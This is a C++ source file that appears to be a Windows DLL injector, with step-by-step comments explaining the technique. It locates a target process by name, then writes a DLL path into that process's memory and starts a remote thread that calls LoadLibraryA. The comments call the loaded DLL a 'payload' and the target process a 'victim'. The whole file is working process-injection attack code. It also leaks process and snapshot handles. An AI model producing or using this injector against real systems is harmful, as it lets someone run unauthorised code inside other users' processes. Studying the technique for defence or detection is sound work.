#include "Injector.h"
#include <tlhelp32.h>
#include <iostream>

// Utility for consistent error logging
void LogError(const std::string& msg) 
{
    DWORD err = GetLastError();
    std::cerr << "[!] " << msg << " | Error: " << err << "\n";
}

DWORD FindProcessID(const std::wstring& processName)
{
    std::cout << "[*] Searching for process: " << std::string(processName.begin(), processName.end()) << "\n";

    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) 
    {
        LogError("CreateToolhelp32Snapshot failed");
        return 0;
    }

    if (!Process32FirstW(snapshot, &entry)) 
    {
        LogError("Process32FirstW failed");
        return 0;
    }

    do {
        std::wcout << L"\t-> Found: " << entry.szExeFile << L"\n";

        if (processName == entry.szExeFile) 
        {
            std::cout << "[+] Match found! PID = " << entry.th32ProcessID << "\n";
            return entry.th32ProcessID;
        }
    } while (Process32NextW(snapshot, &entry));

    std::cout << "[!] Process not found\n";
    return 0;
}

bool InjectDLL(DWORD pid, const std::string& dllPath)
{
    std::cout << "[*] Starting DLL injection\n";
    std::cout << "\tPID: " << pid << "\n";
    std::cout << "\tDLL: " << dllPath << "\n";

    /*
     * 1. Get handle to target with permissions to create threads
     *    and reserve/modify virtual memory.
     */
    HANDLE target_proc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE, 
        pid
    );
    if (!target_proc) 
    {
        LogError("OpenProcess failed");
        return false;
    }
    std::cout << "[+] OpenProcess succeeded\n";

    /*
     * 2. Reserve a section of memory in target to place DLL.
     */
    void* remote_mem_allocation = VirtualAllocEx(
        target_proc, nullptr /* don't care where */,
        dllPath.size() + 1,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!remote_mem_allocation) 
    {
        LogError("VirtualAllocEx failed");
        return false;
    }
    std::cout << "[+] Allocated remote memory @ " << remote_mem_allocation << "\n";

    /*
     * 3. Write the absolute path of the DLL payload into reserved memory allocation.
     */
    bool write_proc_mem_successful = WriteProcessMemory(
        target_proc, remote_mem_allocation,
        dllPath.c_str(), dllPath.size() + 1,
        nullptr
    );
    if (!write_proc_mem_successful) {
        LogError("WriteProcessMemory failed");
        return false;
    }
    std::cout << "[+] DLL path written to remote process\n";

    /*
     * 4. The goal is to call LoadLibraryA("C:\\path\\to\\payload.dll") but 
     *    you can't just say that, because this code is not inside that process.
     *    LoadLibraryA is defined in kernel32.dll, which is loaded by every 
     *    userspace process usually at a predictable location.
     */
    HMODULE kernel32_module = GetModuleHandleA("kernel32.dll");
    if (!kernel32_module) 
    {
        std::cerr << "[!] Failed to get handle to kernel32.dll\n";
        return false;
    }

    auto addr_of_LoadLibraryA = GetProcAddress(kernel32_module, "LoadLibraryA");
    if (!addr_of_LoadLibraryA) 
    {
        std::cerr << "[!] Failed to get address of LoadLibraryA\n";
        return false;
    }
    std::cout << "[+] LoadLibraryA address: " << addr_of_LoadLibraryA << "\n";

    /*
     * 5. Start a remote thread in the target that tricks victim to run 
     *    LoadLibraryA("C:\\path\\to\\payload.dll") as a separate thread.
     *    This thread's sole job is to load the DLL then terminate.
     */
    HANDLE load_lib_thread = CreateRemoteThread(
        target_proc,
        nullptr,
        0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(addr_of_LoadLibraryA), // function to run
        remote_mem_allocation, // arguments
        0,
        nullptr
    );
    if (!load_lib_thread) 
    {
        LogError("CreateRemoteThread failed");
        return false;
    }
    std::cout << "[+] Remote thread running LoadLibraryA(...) created\n";

    /*
     * 6. Wait for the LoadLibraryA thread to finish and get its exit code to
     *    confirm the injection was successful.
     */
    WaitForSingleObject(load_lib_thread, INFINITE);
    std::cout << "[+] Injection complete\n";

    DWORD exitCode = 0;
    GetExitCodeThread(load_lib_thread, &exitCode);
    std::cout << "[*] LoadLibraryA returned: 0x" << std::hex << exitCode << "\n";

    return exitCode;
}